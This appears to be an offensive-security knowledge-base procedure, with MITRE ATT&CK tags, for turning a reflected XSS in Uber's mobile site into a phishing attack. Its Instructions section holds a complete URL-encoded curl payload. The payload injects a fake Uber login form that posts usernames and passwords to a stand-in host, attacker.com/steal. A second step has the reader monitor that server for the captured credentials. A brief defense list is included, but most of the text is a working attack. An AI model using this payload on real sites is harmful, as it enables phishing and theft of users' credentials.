---
id: proc-uuid-2
name: Inject-Phishing-Login-Form-via-XSS-Payload
tags:
  - xss
  - phishing
  - credential-harvesting
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-inject-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.129Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Phishing-Login-Form-via-XSS-Payload

## Summary

This procedure builds on the reflected XSS in Uber's udi-id parameter to inject a fake login form, enabling phishing attacks that capture usernames, passwords, and potentially credit card details by mimicking Uber's authentication interface over SSL.

## Description

Using the same unescaped reflection point, the payload injects a div containing a form with input fields for credentials and a submit button. Due to CSP allowing *.cloudfront.net, attackers can host exfiltration scripts there; missing base-uri permits resource redirects. This targets users accessing the mobile endpoint, leading to credential theft. Requires prior confirmation of basic XSS.

## Requirements

1. Confirmed XSS vulnerability from prior procedure
2. HTTP client for payload delivery
3. Optional: Attacker-controlled server for form submission (e.g., to log credentials)

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP with report-uri for violations and no wildcards
- Add client-side validation and server-side input filtering for query params
- Detect form injections via anomaly detection in access logs or browser security tools

## Objectives

1. Render a convincing phishing form on the vulnerable page
2. Capture submitted credentials for exfiltration
3. Demonstrate high-impact credential harvesting

## Instructions

### Step 1: Craft Phishing Payload

**Context**: Extend the basic payload to include a form that submits to an attacker endpoint (replace with real URL for production testing).

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl "https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?udi-id=%22%7D%7D%3C%2Fscript%3E%3Cdiv class='_b _c _d _e _f _g _h _i _a3 _a4 _a5 _a6 _a7 _a8 _a9 _aa _ab _ac _ad _ae _af _ag _ah _ai _aj _ak _al _am _an _ao _ap _aq _ar _as _at _au _av _aw'%3E%3Ch2%3ELogin to your Uber account%3C%2Fh2%3E%3Cform action='http://attacker.com/steal'%3E%3Cinput type='text' name='username' placeholder='username' /%3E%3Cinput type='password' name='password' placeholder='password' /%3E%3Cbutton type='submit' class='btn'%3ELogin%3C%2Fbutton%3E%3Ca class='forgot' href='#'%3EForgot Your Uber Username?%3C%2Fa%3E%3C%2Fform%3E%3C%2Fdiv%3E"
```

> The response shows the injected form HTML. In a browser, it renders as a functional login interface.

### Step 2: Test Form Submission

**Context**: Interact with the form to simulate user input and verify exfiltration potential.

**Command** (Manual Interaction):
```bash
# Load URL in browser and submit form with test credentials
# Monitor attacker server for POST data: username=...&password=...
```

> Successful submission sends credentials to the action URL, confirming phishing viability.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[Phishing]]
- [[credential-harvesting]]
